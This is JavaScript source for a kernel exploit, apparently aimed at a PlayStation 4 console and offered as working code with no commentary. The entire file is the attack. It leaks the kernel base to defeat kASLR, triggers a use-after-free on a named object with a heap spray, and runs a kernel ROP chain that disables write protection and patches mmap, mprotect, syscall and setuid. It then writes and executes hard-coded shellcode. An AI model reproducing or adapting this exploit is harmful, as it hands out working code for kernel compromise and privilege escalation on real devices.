function getKernelBase_namedobj() {
	// Setup Buffers related to leaking
	var leakData = p.malloc(0x4C0);
	var leakScePThrPtr = p.malloc(0x08);

	p.fcall(window.gadgets["scePthreadCreate"], leakScePThrPtr, 0, window.gadgets["infloop"], leakData, p.stringify("leakThr"));

	//////////////// LEAK ////////////////
	
	var stage1 = new rop();
	stage1.fcall(window.syscalls[window.syscallnames['sys_thr_suspend_ucontext']], p.read4(p.read8(leakScePThrPtr)));
	stage1.fcall(window.syscalls[window.syscallnames['sys_open']], p.stringify("/dev/dipsw"), 0, 0);
	stage1.fcall(window.syscalls[window.syscallnames['sys_thr_get_ucontext']], p.read4(p.read8(leakScePThrPtr)), leakData);
	stage1.run();

	var kernelBase = p.read8(leakData.add32(0x128)).sub32(window.kernel_offsets["_vn_lock_break_slide"]); // slide (break instruction in _vn_lock)
	// Leak integrity check: kASLR defeat check
	if (kernelBase.low & 0x3FFF)
		alert("Bad leak!");
	
	return kernelBase;
}

function kernExploit_namedobj() {
	try {
		//alert("Starting namedobj kexploit");
		
		//////////////// SETUP ////////////////

        // Setup buffers for important pre-exploit stuff
        var kernelBase = p.malloc(0x08);
        var objBase = p.malloc(0x08);
        var stackLeakFix = p.malloc(0x08);

        var namedObj = p.malloc(0x08);
        var serviceBuff = p.malloc(0x80);

        var obj_cdev_priv = p.malloc(0x180);
        var obj_cdevsw = p.malloc(0x0B0);

        var kernelBase = p.malloc(0x08);

        // File descriptor for target
        var targetDevFd = p.malloc(0x08);

        // Setup Buffers related to leaking
        var leakData = p.malloc(0x4C0);
        var leakScePThrPtr = p.malloc(0x08);

        var createLeakThr = p.fcall(window.gadgets["scePthreadCreate"], leakScePThrPtr, 0, window.gadgets["infloop"], leakData, p.stringify("leakThr"));

        //////////////// LEAK ////////////////

        //alert("Calculating ASLR and Object Base...");

        p.write8(namedObj, p.syscall('sys_namedobj_create', p.stringify("debug"), 0xDEAD, 0x5000));

        var stage1 = new rop();
        stage1.fcall(window.syscalls[window.syscallnames['sys_thr_suspend_ucontext']], p.read4(p.read8(leakScePThrPtr)));
        stage1.fcall(window.syscalls[window.syscallnames['sys_open']], p.stringify("/dev/dipsw"), 0, 0);
        stage1.saveReturnValue(targetDevFd);
        stage1.fcall(window.syscalls[window.syscallnames['sys_thr_get_ucontext']], p.read4(p.read8(leakScePThrPtr)), leakData);
        stage1.run();

        // Extract leaks
        kernelBase = p.read8(leakData.add32(0x128)).sub32(window.kernel_offsets["_vn_lock_break_slide"]);
        objBase = p.read8(leakData.add32(0x130));
        stackLeakFix = p.read8(leakData.add32(0x20));

        // Leak integrity check: kASLR defeat check
        if (kernelBase.low & 0x3FFF) {
          alert("Bad leak! Terminating.");
          return false;
        }

        p.write8(serviceBuff.add32(0x4), objBase);
        p.writestr(serviceBuff.add32(0x28), "debug");

        //////////////// BUILD KROP CHAIN ////////////////

        var kchainstack = p.malloc(0x200);
        var kchain = new kropchain(kchainstack);

		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			kchain.write64(kernelBase.add32(dest_offset), patch_data_qword);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			kchain.write64(kernelBase.add32(dest_offset), kernelBase.add32(src_offset));
		}
		
        // Disable kernel write protection
        kchain.push(window.gadgets["pop rax"]);
        kchain.push(0x80040033);
        kchain.push(kernelBase.add32(window.kernel_offsets["mov cr0, rax"]));

        // Fix cdev_priv->cdp_c->si_devsw
        kchain.write64(objBase.add32(0xB8), kernelBase.add32(0x1926550));

        // Patch sys_mmap: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
        
		// Patch sys_mprotect: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
		
        // Patch syscall: syscall instruction allowed anywhere
		//kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
		kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));
		
        // Patch sys_dynlib_dlsym: Allow from anywhere
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));
		
        // Add custom sys_exec() call to execute arbitrary code as kernel
		kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
		kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
		kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
		
        // Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
		kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
		
        // Fix object
        kchain.push(window.gadgets["pop rax"]);
        kchain.push(kernelBase.add32(0x19536E0));
        kchain.push(window.gadgets["mov rax, [rax]"]);
        kchain.push(window.gadgets["pop rdi"]);
        kchain.push(objBase.add32(0x50));
        kchain.push(window.gadgets["mov [rdi], rax"]);

        // Exit kernel ROP chain
        kchain.push(window.gadgets["pop rax"]);
        kchain.push(stackLeakFix.add32(0x3C0));
        kchain.push(window.gadgets["pop rcx"]);
        kchain.push(window.gadgets["pop rsp"]);
        kchain.push(window.gadgets["push rax; jmp rcx"]);

        //alert("KROP chain size: " + kchain.count);

        //////////////// FAKE THE OBJECT ////////////////

        //////// FAKE CDEV_PRIV ////////
        p.write8(obj_cdev_priv.add32(0x008), 0x0000000000000004);

        p.write8(obj_cdev_priv.add32(0x048), 0x00000000000001A4);
        p.write8(obj_cdev_priv.add32(0x058), 0x0000001000000000); // Fix
        p.write8(obj_cdev_priv.add32(0x060), 0x0000000000000004);
        p.write8(obj_cdev_priv.add32(0x068), kernelBase.add32(0x19265F8));

        p.write8(obj_cdev_priv.add32(0x0A0), objBase.add32(0x0E0));
        p.write8(obj_cdev_priv.add32(0x0B8), obj_cdevsw); // Target Object
        p.write8(obj_cdev_priv.add32(0x0C0), 0x0000000000010000);
        p.write8(obj_cdev_priv.add32(0x0C8), 0x0000000000000001);
        p.write8(obj_cdev_priv.add32(0x0E0), window.gadgets["ret"]); // New RIP value for stack pivot
        p.write8(obj_cdev_priv.add32(0x0F0), objBase); // Use as a back pointer to the object
        p.write8(obj_cdev_priv.add32(0x0F8), kchainstack); // New RSP value for stack pivot

        //////// FAKE CDEVSW ////////
        p.write8(obj_cdevsw.add32(0x38), window.o2lc(0xA826F)); // d_ioctl - TARGET FUNCTION POINTER

        //////////////// FREE THE OBJECT ////////////////
		
        var stage3 = new rop();
        stage3.fcall(window.syscalls[window.syscallnames['sys_mdbg_service']], 1, serviceBuff, 0);
        stage3.fcall(window.syscalls[window.syscallnames['sys_namedobj_delete']], p.read8(namedObj), 0x5000);

        // Spraying the heap!
        for (var i = 0; i < 500; i++)
          stage3.fcall(window.syscalls[window.syscallnames['sys_ioctl']], 0xDEADBEEF, 0x81200000, obj_cdev_priv);
        stage3.run();

        //////////////// TRIGGER ////////////////
		
        // Triggering kernel code execution
        p.syscall('sys_ioctl', p.read8(targetDevFd), 0x81200000, obj_cdev_priv);

        //////////////// FIX ////////////////
		
        // Allocating executable memory for fix payload...

        var baseAddressExecute = new int64(0xDEAD0000, 0);
        var exploitExecuteAddress = p.syscall("sys_mmap", baseAddressExecute, 0x10000, 7, 0x1000, -1, 0);

        var executeSegment = new memory(exploitExecuteAddress);

        var objBaseStore = executeSegment.allocate(0x8);
        var shellcode = executeSegment.allocate(0x200);

        p.write8(objBaseStore, objBase);

        p.write4(shellcode.add32(0x00000000), 0x00000be9);
        p.write4(shellcode.add32(0x00000004), 0x90909000);
        p.write4(shellcode.add32(0x00000008), 0x90909090);
        p.write4(shellcode.add32(0x0000000c), 0x90909090);
        p.write4(shellcode.add32(0x00000010), 0x0082b955);
        p.write4(shellcode.add32(0x00000014), 0x8948c000);
        p.write4(shellcode.add32(0x00000018), 0x415741e5);
        p.write4(shellcode.add32(0x0000001c), 0x41554156);
        p.write4(shellcode.add32(0x00000020), 0x83485354);
        p.write4(shellcode.add32(0x00000024), 0x320f18ec);
        p.write4(shellcode.add32(0x00000028), 0x89d58949);
        p.write4(shellcode.add32(0x0000002c), 0x64b948c0);
        p.write4(shellcode.add32(0x00000030), 0x77737069);
        p.write4(shellcode.add32(0x00000034), 0x49000000);
        p.write4(shellcode.add32(0x00000038), 0x4120e5c1);
        p.write4(shellcode.add32(0x0000003c), 0x000200bc);
        p.write4(shellcode.add32(0x00000040), 0xc5094900);
        p.write4(shellcode.add32(0x00000044), 0xd0b58d4d);
        p.write4(shellcode.add32(0x00000048), 0x49ffcf14);
        p.write4(shellcode.add32(0x0000004c), 0x8a509d8d);
        p.write4(shellcode.add32(0x00000050), 0x81490003);
        p.write4(shellcode.add32(0x00000054), 0x030b50c5);
        p.write4(shellcode.add32(0x00000058), 0x868d4901);
        p.write4(shellcode.add32(0x0000005c), 0x001d18d0);
        p.write4(shellcode.add32(0x00000060), 0x00c68149);
        p.write4(shellcode.add32(0x00000064), 0x48001d17);
        p.write4(shellcode.add32(0x00000068), 0x48c04589);
        p.write4(shellcode.add32(0x0000006c), 0xad0000a1);
        p.write4(shellcode.add32(0x00000070), 0x000000de);
        p.write4(shellcode.add32(0x00000074), 0x45894800);
        p.write4(shellcode.add32(0x00000078), 0x888948c8);
        p.write4(shellcode.add32(0x0000007c), 0x000000e0);
        p.write4(shellcode.add32(0x00000080), 0xf080c748);
        p.write4(shellcode.add32(0x00000084), 0x00000000);
        p.write4(shellcode.add32(0x00000088), 0x48000000);
        p.write4(shellcode.add32(0x0000008c), 0x00f880c7);
        p.write4(shellcode.add32(0x00000090), 0x00000000);
        p.write4(shellcode.add32(0x00000094), 0x1aeb0000);
        p.write4(shellcode.add32(0x00000098), 0x00841f0f);
        p.write4(shellcode.add32(0x0000009c), 0x00000000);
        p.write4(shellcode.add32(0x000000a0), 0x4cee894c);
        p.write4(shellcode.add32(0x000000a4), 0x8b48ff89);
        p.write4(shellcode.add32(0x000000a8), 0xd0ffc045);
        p.write4(shellcode.add32(0x000000ac), 0x01ec8341);
        p.write4(shellcode.add32(0x000000b0), 0x02ba2774);
        p.write4(shellcode.add32(0x000000b4), 0x4c000000);
        p.write4(shellcode.add32(0x000000b8), 0x80bfee89);
        p.write4(shellcode.add32(0x000000bc), 0x41000001);
        p.write4(shellcode.add32(0x000000c0), 0x8d48d6ff);
        p.write4(shellcode.add32(0x000000c4), 0x00006f3d);
        p.write4(shellcode.add32(0x000000c8), 0xc7894900);
        p.write4(shellcode.add32(0x000000cc), 0x31c68948);
        p.write4(shellcode.add32(0x000000d0), 0x4cd3ffc0);
        p.write4(shellcode.add32(0x000000d4), 0x75c87d39);
        p.write4(shellcode.add32(0x000000d8), 0xe43145c7);
        p.write4(shellcode.add32(0x000000dc), 0xc8758b48);
        p.write4(shellcode.add32(0x000000e0), 0x5f3d8d48);
        p.write4(shellcode.add32(0x000000e4), 0x31000000);
        p.write4(shellcode.add32(0x000000e8), 0x0fd3ffc0);
        p.write4(shellcode.add32(0x000000ec), 0x0000441f);
        p.write4(shellcode.add32(0x000000f0), 0x0000a148);
        p.write4(shellcode.add32(0x000000f4), 0x0000dead);
        p.write4(shellcode.add32(0x000000f8), 0x89440000);
        p.write4(shellcode.add32(0x000000fc), 0x3d8d48e6);
        p.write4(shellcode.add32(0x00000100), 0x0000005c);
        p.write4(shellcode.add32(0x00000104), 0x20148b4a);
        p.write4(shellcode.add32(0x00000108), 0x08c48349);
        p.write4(shellcode.add32(0x0000010c), 0xd3ffc031);
        p.write4(shellcode.add32(0x00000110), 0x80fc8149);
        p.write4(shellcode.add32(0x00000114), 0x75000001);
        p.write4(shellcode.add32(0x00000118), 0x3d8d48d7);
        p.write4(shellcode.add32(0x0000011c), 0x00000060);
        p.write4(shellcode.add32(0x00000120), 0xd3ffc031);
        p.write4(shellcode.add32(0x00000124), 0x18c48348);
        p.write4(shellcode.add32(0x00000128), 0x415bc031);
        p.write4(shellcode.add32(0x0000012c), 0x415d415c);
        p.write4(shellcode.add32(0x00000130), 0x5d5f415e);
        p.write4(shellcode.add32(0x00000134), 0x909090c3);
        p.write4(shellcode.add32(0x00000138), 0x6f6c6c41);
        p.write4(shellcode.add32(0x0000013c), 0x30203a63);
        p.write4(shellcode.add32(0x00000140), 0x786c2578);
        p.write4(shellcode.add32(0x00000144), 0x624f000a);
        p.write4(shellcode.add32(0x00000148), 0x7463656a);
        p.write4(shellcode.add32(0x0000014c), 0x6d754420);
        p.write4(shellcode.add32(0x00000150), 0x78302070);
        p.write4(shellcode.add32(0x00000154), 0x0a786c25);
        p.write4(shellcode.add32(0x00000158), 0x00000000);
        p.write4(shellcode.add32(0x0000015c), 0x00000000);
        p.write4(shellcode.add32(0x00000160), 0x6265443c);
        p.write4(shellcode.add32(0x00000164), 0x203e6775);
        p.write4(shellcode.add32(0x00000168), 0x656a624f);
        p.write4(shellcode.add32(0x0000016c), 0x2b207463);
        p.write4(shellcode.add32(0x00000170), 0x25783020);
        p.write4(shellcode.add32(0x00000174), 0x3a783330);
        p.write4(shellcode.add32(0x00000178), 0x25783020);
        p.write4(shellcode.add32(0x0000017c), 0x000a786c);
        p.write4(shellcode.add32(0x00000180), 0x6265443c);
        p.write4(shellcode.add32(0x00000184), 0x203e6775);
        p.write4(shellcode.add32(0x00000188), 0x7473754a);
        p.write4(shellcode.add32(0x0000018c), 0x726f4620);
        p.write4(shellcode.add32(0x00000190), 0x7468203a);
        p.write4(shellcode.add32(0x00000194), 0x3a737074);
        p.write4(shellcode.add32(0x00000198), 0x77772f2f);
        p.write4(shellcode.add32(0x0000019c), 0x6f792e77);
        p.write4(shellcode.add32(0x000001a0), 0x62757475);
        p.write4(shellcode.add32(0x000001a4), 0x6f632e65);
        p.write4(shellcode.add32(0x000001a8), 0x61772f6d);
        p.write4(shellcode.add32(0x000001ac), 0x3f686374);
        p.write4(shellcode.add32(0x000001b0), 0x4a563d76);
        p.write4(shellcode.add32(0x000001b4), 0x6d6c5247);
        p.write4(shellcode.add32(0x000001b8), 0x4c6c6133);
        p.write4(shellcode.add32(0x000001bc), 0x00000a59);

        // Running fix payload...
        var stage6 = new rop();
        stage6.push(window.gadgets["pop rax"]);
        stage6.push(11);
        stage6.push(window.gadgets["pop rdi"]);
        stage6.push(shellcode);
        stage6.push(window.o2lk(0x29CA)); // "syscall" gadget		
        stage6.run();
		
		if (p.syscall("sys_setuid", 0) == 0)
			return true;
		else
			throw "Kernel exploit failed!";
		return false;
		
	} catch(ex) {
		fail(ex);
		return false;
	}
	
	// failed (should never go here)
	return false;
}